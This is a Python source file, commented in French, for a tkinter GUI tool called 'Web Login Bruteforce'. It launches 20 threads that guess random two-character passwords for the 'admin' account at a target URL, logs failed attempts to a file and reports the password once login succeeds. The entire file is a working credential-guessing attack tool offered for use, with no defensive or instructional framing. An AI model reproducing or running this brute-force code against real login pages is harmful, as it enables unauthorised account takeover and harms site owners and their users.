import requests  # Importation de la bibliothèque requests pour effectuer des requêtes HTTP
import random  # Importation du module random pour générer des mots de passe aléatoires
from threading import Thread  # Importation de la classe Thread pour permettre l'exécution concurrente de plusieurs tâches
import os  # Importation du module os pour effectuer des opérations sur le système d'exploitation
import tkinter as tk  # Importation de la bibliothèque tkinter pour créer une interface graphique
from tkinter import messagebox  # Importation de la classe messagebox pour afficher des boîtes de dialogue

# Fonction pour envoyer une requête au serveur avec un nom d'utilisateur et un mot de passe donnés
def send_request(url, username, password):
    data = {
        "username": username,
        "password": password
    }

    r = requests.get(url, data=data)  # Envoi d'une requête GET avec les données d'authentification
    return r  # Retour de la réponse du serveur

# Fonction pour effectuer le bruteforce sur le site cible
def bruteforce(url, username, result_text):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"  # Liste des caractères autorisés pour les mots de passe

    while True:  # Boucle jusqu'à ce que le mot de passe correct soit trouvé ou que le programme soit arrêté
        valid = False  # Indicateur pour savoir si le mot de passe généré est valide
        while not valid:  # Boucle pour générer un mot de passe valide
            rndpasswd = random.choices(chars, k=2)  # Génération aléatoire d'une séquence de 2 caractères
            passwd = "".join(rndpasswd)  # Concaténation des caractères pour former le mot de passe
            file = open("test.txt", 'r')  # Ouverture du fichier contenant les tentatives précédentes
            tries = file.read()  # Lecture des tentatives précédentes
            file.close()  # Fermeture du fichier
            if passwd in tries:  # Vérification si le mot de passe a déjà été essayé
                pass  # Si oui, passer à la génération d'un nouveau mot de passe
            else:
                valid = True  # Si non, le mot de passe est valide et la boucle s'arrête
            
        r = send_request(url, username, passwd)  # Envoi de la requête avec le nom d'utilisateur et le mot de passe actuels

        if 'failed to login' in r.text.lower():  # Vérification si l'authentification a échoué
            with open("test.txt", "a") as f:  # Ouverture du fichier pour enregistrer les tentatives infructueuses
                f.write(f"{passwd}\n")  # Écriture du mot de passe infructueux dans le fichier
            result_text.config(state=tk.NORMAL)  # Activation de la zone de texte des résultats
            result_text.insert(tk.END, f"Incorrect {passwd}\n")  # Ajout du mot de passe infructueux aux résultats
            result_text.config(state=tk.DISABLED)  # Désactivation de la zone de texte des résultats
        else:  # Si l'authentification réussit
            result_text.config(state=tk.NORMAL)  # Activation de la zone de texte des résultats
            result_text.insert(tk.END, f"Correct Password: {passwd}\n")  # Ajout du mot de passe correct aux résultats
            result_text.config(state=tk.DISABLED)  # Désactivation de la zone de texte des résultats
            break  # Sortie de la boucle, car le mot de passe correct a été trouvé

# Fonction pour démarrer le bruteforce
def start_bruteforce():
    url = url_entry.get()  # Récupération de l'URL saisie par l'utilisateur
    if not url:  # Vérification si l'URL est vide
        messagebox.showwarning("Warning", "Please enter the URL.")  # Affichage d'un avertissement si l'URL est vide
        return

    username = 'admin'  # Nom d'utilisateur à utiliser pour l'authentification
    result_text.config(state=tk.NORMAL)  # Activation de la zone de texte des résultats
    result_text.delete("1.0", tk.END)  # Effacement des anciens résultats
    result_text.config(state=tk.DISABLED)  # Désactivation de la zone de texte des résultats

    # Lancement de plusieurs threads pour effectuer le bruteforce en parallèle
    for _ in range(20):
        Thread(target=bruteforce, args=(url, username, result_text)).start()

# Création de la fenêtre principale
root = tk.Tk()
root.title("Web Login Bruteforce")  # Définition du titre de la fenêtre

# Entrée pour l'URL cible
url_label = tk.Label(root, text="Target URL:")  # Création d'une étiquette pour l'entrée de l'URL
url_label.pack(pady=5)  # Placement de l'étiquette dans la fenêtre
url_entry = tk.Entry(root, width=50)  # Création d'une entrée pour saisir l'URL
url_entry.pack(pady=5)  # Placement de l'entrée dans la fenêtre

# Bouton pour démarrer le bruteforce
bruteforce_button = tk.Button(root, text="Start Bruteforce", command=start_bruteforce)  # Création d'un bouton pour démarrer le bruteforce
bruteforce_button.pack(pady=5)  # Placement du bouton dans la fenêtre

# Boîte de texte pour afficher les résultats
result_text = tk.Text(root, wrap=tk.WORD, width=60, height=10)  # Création d'une zone de texte pour afficher les résultats
result_text.pack(pady=5)  # Placement de la zone de texte dans la fenêtre
result_text.config(state=tk.DISABLED)  # Désactivation de la zone de texte des résultats

# Affichage de la fenêtre
root.mainloop()
